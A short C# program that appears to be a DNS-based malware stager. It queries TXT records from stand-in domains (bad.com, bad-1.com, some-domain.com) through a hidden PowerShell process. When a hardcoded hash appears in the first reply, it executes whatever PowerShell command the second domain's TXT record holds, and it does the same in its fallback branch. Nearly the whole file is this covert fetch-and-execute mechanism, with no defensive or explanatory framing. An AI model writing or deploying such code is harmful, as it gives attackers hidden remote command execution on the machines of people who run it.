using System.Diagnostics;
class Program
{
    static void Main()
    {
        // Get all TXT entries from original domain - FIRST
        string psCommand = "nslookup -q=txt bad.com"; 

        // Run the PowerShell command and get the results
        string result = RunPowerShellCommand(psCommand);

        // Check if the result contains the string/hash in first request
        if (result.Contains("9fe8ec4dc33fd875e8fa6560f65f9be8"))
        {
            // If the result contains the string/hash, run a new command
            Console.WriteLine("Output contains '9fe8ec4dc33fd875e8fa6560f65f9be8', executing new command...");

			// make request to "bad-1.com" and execute the stored command(s)- SECOND
            string newCommand = "echo 'FIRST-BASE' > first_base.txt;powershell (nslookup -q=txt bad-1.com)[5]";

            string newResult = RunPowerShellCommand(newCommand);

            // Print the results of the new command
            Console.WriteLine(newResult);
        }
        else
        {
            // If certain string/hash is not found, print the initial result
            string humbleCommand = "powershell (nslookup -q=txt some-domain.com)[5]";
            Console.WriteLine("No base. Nothing here to see");
            string newResult = RunPowerShellCommand(humbleCommand);
            Console.WriteLine(humbleCommand);
        }
    }

    static string RunPowerShellCommand(string command)
    {
        // Initialize the process to run PowerShell
        ProcessStartInfo processStartInfo = new ProcessStartInfo
        {
            FileName = "powershell.exe",      // Specify PowerShell executable
            Arguments = command,              // Pass the command to execute
            RedirectStandardOutput = true,    // Redirect the standard output
            RedirectStandardError = true,     // Redirect error output
            UseShellExecute = false,          // Do not use the shell to start the process
            CreateNoWindow = true             // Do not create a new window
        };

        // Start the process and read the output
        using (Process process = Process.Start(processStartInfo))
        {
            using (StreamReader reader = process.StandardOutput)
            {
                // Read the entire output from the PowerShell command
                return reader.ReadToEnd();
            }
        }
    }
}
